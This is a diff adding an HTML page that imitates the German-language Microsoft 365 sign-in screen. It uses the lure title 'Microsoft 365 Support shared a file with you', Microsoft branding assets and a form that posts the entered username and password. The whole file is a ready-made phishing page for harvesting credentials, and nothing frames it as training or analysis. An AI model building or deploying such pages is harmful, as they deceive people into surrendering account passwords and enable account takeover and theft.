@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="de">
+
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="description" content="Microsoft 365 Support shared a file with you">
+        <title>Microsoft 365 Support shared a file with you</title>
+        
+        <!-- TailwindCSS -->
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link
+            href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css"
+            rel="stylesheet">
+
+        <!-- Favicon -->
+        <link rel="icon" href="favicon.ico">
+        <!-- Weitere Meta-Tags können hier hinzugefügt werden -->
+         <style>
+            html {
+                font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+                font-size: .9375rem;
+                line-height: 1.5;
+                color: #1b1b1b;
+                background-image: url(../images/o365-microsoft-login-background.svg);
+            }
+            .link {
+                color: #0067b8;
+                text-decoration: none;
+            }
+            .link:hover{
+                color: #999;
+                text-decoration: underline;
+            }
+            input[type="submit"] {
+                min-height: 32px;
+                min-width: 108px;
+                cursor: pointer;
+                background-color: #0067b8;
+            }
+            input[type="submit"]:hover {
+                background-color: #005da6;
+            }
+         </style>
+    </head>
+
+    <body class="flex items-center justify-center min-h-screen">
+        <div style="width: 440px; height: 338px;">
+            <div class="mb-5 bg-white rounded-sm shadow-lg" style="color: #1b1b1b;">
+                <div class="p-11 w-full max-w-md">
+                    <div class="flex flex-wrap justify-start items-end">
+                        <img src="../images/o365-microsoft-login-logo.svg" alt="Microsoft - Logo" class="h-6 mr-2">
+                        <span class="sr-only font-bold text-black dark:text-white">Microsoft</span>
+                    </div>
+        
+                    <form method="post" class="flex flex-col flex-wrap">
+                        <div class="leading-7 text-2xl font-semibold p-0 mt-4 mb-3">
+                            Anmelden
+                        </div>
+        
+                        <div class="form-group w-full mb-4">
+                            <label for="username" class="sr-only">Username</label>
+                            <input id="username" name="username" type="text" placeholder="E-Mail, Telefon oder Username"
+                                aria-label="Username"
+                                class="form-control w-full border border-[#00000099] dark:border-white rounded-none bg-transparent border-t-0 border-l-0 border-r-0 outline-none h-9 py-1.5 px-2.5 pl-0" />
+                        </div>
+        
+                        <div class="form-group w-full mb-4">
+                            <label for="password" class="sr-only">password</label>
+                            <input id="password" name="password" type="password" placeholder="Password" aria-label="Password"
+                                class="form-control w-full border border-[#00000099] dark:border-white rounded-none bg-transparent border-t-0 border-l-0 border-r-0 outline-none h-9 py-1.5 px-2.5 pl-0" />
+                        </div>
+        
+                        <div class="flex flex-col items-start justify-between">
+                            <div class="form-group text-xs2 mb-4">
+                                <span class="mr-1">Kein Konto?</span>
+                                <a href="#" class="link font-normal whitespace-nowrap hover:underline"
+                                    aria-label="Konto erstellen">Erstellen Sie jetzt eins!</a>
+                            </div>
+                            <div class="form-group text-xs2 mb-4">
+                                <a href="#" class="link font-normal whitespace-nowrap hover:underline">
+                                    Sie können nicht auf Ihr Konto zugreifen?
+                                </a>
+                            </div>
+                        </div>
+        
+                        <div class="flex justify-end">
+                            <input id="submit" type="submit" value="Sign in"
+                                class="relative inline-block py-1 px-3 m-0 border-none  text-white cursor-pointer" />
+                        </div>
+                    </form>
+                </div>
+            </div>
+        
+            <div tabindex="2" class="py-2 px-11 w-full bg-white dark:bg-gray-900 shadow-lg text-[#1b1b1b] dark:text-white hover:bg-[#ccc] focus:bg-[#ccc] focus:border-dashed focus:border focus:border-[#000] cursor-pointer duration-200">
+                <div class="flex flex-row justify-start items-center">
+                    <div class="w-8 h-8">
+                        <img src="../images/o365-microsoft-signin.svg" alt="Signin Options"
+                            class="dark:hidden w-full h-full">
+                        <img src="../images/o365-microsoft-signin-dark.svg" alt="Signin Options"
+                            class="dark:block hidden w-full h-full">
+                    </div>
+                    <div class="leading-4 px-3">
+                        <span>Anmeldeoptionen</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </body>
+
+</html>
